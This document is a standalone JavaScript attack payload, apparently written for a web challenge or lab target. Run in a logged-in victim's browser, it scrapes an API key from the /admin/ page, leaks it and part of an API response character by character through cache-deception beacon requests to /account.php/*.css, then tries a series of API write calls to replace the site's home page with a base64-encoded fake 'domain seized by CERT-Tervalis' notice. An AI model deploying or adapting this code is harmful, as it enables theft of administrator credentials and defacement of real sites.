(async () => {
  const T = "VTG912";
  const bc = async (k) => { try { await fetch('/account.php/'+T+'_'+k+'.css', {credentials:'include',cache:'no-store'}); } catch(e){} };
  const g = (u,o) => fetch(u, Object.assign({credentials:'include',cache:'no-store'},o||{}));
  const fresh = async () => { try { return await (await g('/?_='+Date.now())).text(); } catch(e){ return ''; } };
  const SEIZED = decodeURIComponent(escape(atob("PCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4KPHRpdGxlPlNlaXplZCDigJQgQ0VSVC1UZXJ2YWxpczwvdGl0bGU+CjwhLS0gQ1QtQ0FTRSAtLT4KPGxpbmsgcmVsPSJwcmVjb25uZWN0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tIj4KPGxpbmsgcmVsPSJwcmVjb25uZWN0IiBocmVmPSJodHRwczovL2ZvbnRzLmdzdGF0aWMuY29tIiBjcm9zc29yaWdpbj4KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PUhhbmtlbitHcm90ZXNrOndnaHRANDAwOzUwMDs2MDA7NzAwOzgwMCZmYW1pbHk9SmV0QnJhaW5zK01vbm86d2dodEA0MDA7NTAwOzYwMCZkaXNwbGF5PXN3YXAiPgo8c3R5bGU+CiAgOnJvb3R7LS1wYXBlcjojZjRmM2VmOy0taW5rOiMxOTE3MTM7LS1tdXRlZDojNmE2NTU4Oy0tbGluZTojY2ZjYWJiOy0tc2VhbDojMTcxNDEwOy0tcmVkOiM4ZjJmMjI7CiAgICAtLXNhbnM6IkhhbmtlbiBHcm90ZXNrIiwtYXBwbGUtc3lzdGVtLHN5c3RlbS11aSxTZWdvZSBVSSxSb2JvdG8sQXJpYWwsc2Fucy1zZXJpZjsKICAgIC0tbW9ubzoiSmV0QnJhaW5zIE1vbm8iLHVpLW1vbm9zcGFjZSxNZW5sbyxDb25zb2xhcyxtb25vc3BhY2V9CiAgKntib3gtc2l6aW5nOmJvcmRlci1ib3g7bWFyZ2luOjB9CiAgYm9keXtiYWNrZ3JvdW5kOnZhcigtLXBhcGVyKTtjb2xvcjp2YXIoLS1pbmspO2ZvbnQtZmFtaWx5OnZhcigtLXNhbnMpO2xpbmUtaGVpZ2h0OjEuNjttaW4taGVpZ2h0OjEwMHZoOwogICAgZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO3BhZGRpbmc6NDBweH0KICAubm90aWNle21heC13aWR0aDo2NjBweDt3aWR0aDoxMDAlO3RleHQtYWxpZ246Y2VudGVyO2JvcmRlcjoxcHggc29saWQgdmFyKC0taW5rKTsKICAgIGJveC1zaGFkb3c6MCAwIDAgNXB4IHZhcigtLXBhcGVyKSwwIDAgMCA2cHggdmFyKC0taW5rKTtwYWRkaW5nOjUycHggNDhweCA0NHB4fQogIC5zZWFse21hcmdpbjowIGF1dG8gMjZweDtkaXNwbGF5OmJsb2NrfQogIC5zZWFsIHRleHR7Zm9udC1mYW1pbHk6dmFyKC0tbW9ubyk7ZmlsbDp2YXIoLS1zZWFsKX0KICBoMXtmb250LXdlaWdodDo4MDA7bGV0dGVyLXNwYWNpbmc6LjAxZW07dGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlO2ZvbnQtc2l6ZTpjbGFtcCgyOHB4LDQuNnZ3LDQycHgpO2xpbmUtaGVpZ2h0OjEuMDZ9CiAgLnJ1bGV7d2lkdGg6NjRweDtoZWlnaHQ6M3B4O2JhY2tncm91bmQ6dmFyKC0tcmVkKTttYXJnaW46MjJweCBhdXRvIDI0cHh9CiAgLmxlYWR7bWF4LXdpZHRoOjUyY2g7bWFyZ2luOjAgYXV0bztmb250LXNpemU6MTdweDtjb2xvcjojMmMyYTI0fQogIC5sZWFkIGJ7Zm9udC13ZWlnaHQ6NzAwfQogIC5sZWdhbHttYXgtd2lkdGg6NTJjaDttYXJnaW46MjRweCBhdXRvIDA7Zm9udC1zaXplOjEzLjVweDtjb2xvcjp2YXIoLS1tdXRlZCl9CiAgLmJ5e2ZvbnQtZmFtaWx5OnZhcigtLW1vbm8pO2ZvbnQtc2l6ZToxMnB4O2xldHRlci1zcGFjaW5nOi4xNmVtO3RleHQtdHJhbnNmb3JtOnVwcGVyY2FzZTtjb2xvcjp2YXIoLS1pbmspOwogICAgbWFyZ2luLXRvcDozNHB4O3BhZGRpbmctdG9wOjIycHg7Ym9yZGVyLXRvcDoxcHggc29saWQgdmFyKC0tbGluZSl9CiAgLmJ5IGJ7Y29sb3I6dmFyKC0tcmVkKX0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KICA8bWFpbiBjbGFzcz0ibm90aWNlIj4KICAgIDxzdmcgY2xhc3M9InNlYWwiIHdpZHRoPSIxMzIiIGhlaWdodD0iMTMyIiB2aWV3Qm94PSIwIDAgMjAwIDIwMCIgYXJpYS1sYWJlbD0iQ0VSVC1UZXJ2YWxpcyBzZWFsIj4KICAgICAgPGRlZnM+CiAgICAgICAgPHBhdGggaWQ9InRvcCIgZD0iTSAzMCAxMDAgQSA3MCA3MCAwIDAgMSAxNzAgMTAwIi8+CiAgICAgICAgPHBhdGggaWQ9ImJvdCIgZD0iTSAzMCAxMDAgQSA3MCA3MCAwIDAgMCAxNzAgMTAwIi8+CiAgICAgIDwvZGVmcz4KICAgICAgPGNpcmNsZSBjeD0iMTAwIiBjeT0iMTAwIiByPSI5NCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMTcxNDEwIiBzdHJva2Utd2lkdGg9IjIiLz4KICAgICAgPGNpcmNsZSBjeD0iMTAwIiBjeT0iMTAwIiByPSI4NCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMTcxNDEwIiBzdHJva2Utd2lkdGg9IjEiLz4KICAgICAgPGNpcmNsZSBjeD0iMTAwIiBjeT0iMTAwIiByPSI1MiIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMTcxNDEwIiBzdHJva2Utd2lkdGg9IjEuNSIvPgogICAgICA8dGV4dCBmb250LXNpemU9IjEwLjIiIGxldHRlci1zcGFjaW5nPSIxLjUiIHRleHQtYW5jaG9yPSJtaWRkbGUiPjx0ZXh0UGF0aCBocmVmPSIjdG9wIiBzdGFydE9mZnNldD0iNTAlIj5DT01QVVRFUiBFTUVSR0VOQ1kgUkVTUE9OU0U8L3RleHRQYXRoPjwvdGV4dD4KICAgICAgPHRleHQgZm9udC1zaXplPSIxMi41IiBsZXR0ZXItc3BhY2luZz0iNCIgdGV4dC1hbmNob3I9Im1pZGRsZSI+PHRleHRQYXRoIGhyZWY9IiNib3QiIHN0YXJ0T2Zmc2V0PSI1MCUiPuKYhSAgVEVSVkFMSVMgIOKYhTwvdGV4dFBhdGg+PC90ZXh0PgogICAgICA8ZyBzdHJva2U9IiMxNzE0MTAiIHN0cm9rZS13aWR0aD0iMy41IiBmaWxsPSJub25lIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPgogICAgICAgIDxjaXJjbGUgY3g9IjEwMCIgY3k9Ijc0IiByPSI1LjUiLz4KICAgICAgICA8bGluZSB4MT0iMTAwIiB5MT0iODAiIHgyPSIxMDAiIHkyPSIxMjYiLz4KICAgICAgICA8bGluZSB4MT0iODUiIHkxPSI5NCIgeDI9IjExNSIgeTI9Ijk0Ii8+CiAgICAgICAgPHBhdGggZD0iTSA3NiAxMTAgQSAyNCAyNCAwIDAgMCAxMjQgMTEwIi8+CiAgICAgICAgPGxpbmUgeDE9Ijc2IiB5MT0iMTEwIiB4Mj0iNzAiIHkyPSIxMDQiLz48bGluZSB4MT0iNzYiIHkxPSIxMTAiIHgyPSI4MiIgeTI9IjEwNiIvPgogICAgICAgIDxsaW5lIHgxPSIxMjQiIHkxPSIxMTAiIHgyPSIxMzAiIHkyPSIxMDQiLz48bGluZSB4MT0iMTI0IiB5MT0iMTEwIiB4Mj0iMTE4IiB5Mj0iMTA2Ii8+CiAgICAgIDwvZz4KICAgIDwvc3ZnPgogICAgPGgxPlRoaXMgZG9tYWluIGhhczxicj5iZWVuIHNlaXplZDwvaDE+CiAgICA8ZGl2IGNsYXNzPSJydWxlIj48L2Rpdj4KICAgIDxwIGNsYXNzPSJsZWFkIj5UaGlzIGRvbWFpbiBhbmQgaXRzIGFzc29jaWF0ZWQgc2VydmljZXMgaGF2ZSBiZWVuIDxiPnNlaXplZCBieSBDRVJULVRlcnZhbGlzPC9iPiDigJQgdGhlCiAgICBDb21wdXRlciBFbWVyZ2VuY3kgUmVzcG9uc2UgVGVhbSBvZiBUZXJ2YWxpcyDigJQgYW5kIGFyZSBubyBsb25nZXIgaW4gc2VydmljZS48L3A+CiAgICA8cCBjbGFzcz0ibGVnYWwiPlVuYXV0aG9yaXplZCBhY2Nlc3MgdG8gdGhpcyBzeXN0ZW0gaXMgcHJvaGliaXRlZCBhbmQgbWF5IGJlIHN1YmplY3QgdG8gaW52ZXN0aWdhdGlvbiBhbmQKICAgIHByb3NlY3V0aW9uIHVuZGVyIHRoZSBsYXdzIG9mIFRlcnZhbGlzLjwvcD4KICAgIDxkaXYgY2xhc3M9ImJ5Ij5CeSBvcmRlciBvZiA8Yj5DRVJULVRlcnZhbGlzPC9iPiDCtyBDeWJlciBEaXZpc2lvbjwvZGl2PgogIDwvbWFpbj4KPC9ib2R5Pgo8L2h0bWw+Cg==")));
  try {
    await bc('A');
    const adminHtml = await (await g('/admin/')).text().catch(()=>'');
    const km = adminHtml.match(/api_key=([A-Za-z0-9_\-]+)/);
    const apiKey = km ? km[1] : '';
    if (!apiKey) { await bc('NOKEY'); return; }
    await bc('KLEN_'+apiKey.length);
    // Nibble-based beacon: for each char of apiKey, emit one beacon
    // Hex chars (0-f) -> nibble value 0-15; non-hex use high nibble
    for (let i=0;i<Math.min(apiKey.length,44);i++) {
      const c=apiKey[i]; const hv=parseInt(c,16);
      if (!isNaN(hv)) { await bc('N'+i+'_'+hv); }
      else { await bc('K'+i+'_'+apiKey.charCodeAt(i)); }
    }
    await bc('NEND');
    // Try GET /api/pages with api_key to see page list
    let apiPagesText='';
    try {
      const r=await g('/api/pages?api_key='+encodeURIComponent(apiKey));
      apiPagesText=await r.text();
      await bc('APIRESP_'+r.status);
    } catch(e){}
    // Exfil first 60 chars of /api/pages response via char beacons
    for (let i=0;i<Math.min(apiPagesText.length,60);i++) {
      await bc('R'+i+'_'+apiPagesText.charCodeAt(i));
    }
    await bc('REND');
    // Try targeted write endpoints
    const toTry=[
      ['/api/pages','PUT','application/json',JSON.stringify({slug:'home',content:SEIZED})],
      ['/api/pages','PUT','application/json',JSON.stringify({id:1,content:SEIZED})],
      ['/api/pages/home','PUT','application/json',JSON.stringify({content:SEIZED})],
      ['/api/pages/home','PATCH','application/json',JSON.stringify({content:SEIZED})],
      ['/api/pages/1','PUT','application/json',JSON.stringify({content:SEIZED})],
      ['/api/pages/1','PATCH','application/json',JSON.stringify({content:SEIZED})],
      ['/api/content','POST','application/json',JSON.stringify({slug:'home',content:SEIZED})],
      ['/api/v1/pages','PUT','application/json',JSON.stringify({slug:'home',content:SEIZED})],
    ];
    for (const [ep,meth,ct,body] of toTry) {
      try {
        const r=await g(ep+'?api_key='+encodeURIComponent(apiKey),{method:meth,headers:{'Content-Type':ct},body});
        const sc=r.status;
        await bc('W_'+ep.replace(/\//g,'_')+'_'+meth.slice(0,2)+'_'+sc);
        if (sc<400) {
          const h=await fresh();
          if (h.includes('CERT-Tervalis')) { await bc('SUCCESS'); return; }
          await bc('WNV_'+sc);
        }
      } catch(e){}
    }
    // Exfil the api_key fully via WCD path trick
    // Admin fetches /account.php/VTG912_KEY_<full_key>.css
    // We can then check candidate keys
    await bc('KEY_'+apiKey);
    await bc('DONE');
  } catch(e){ await bc('ERR'); }
})();
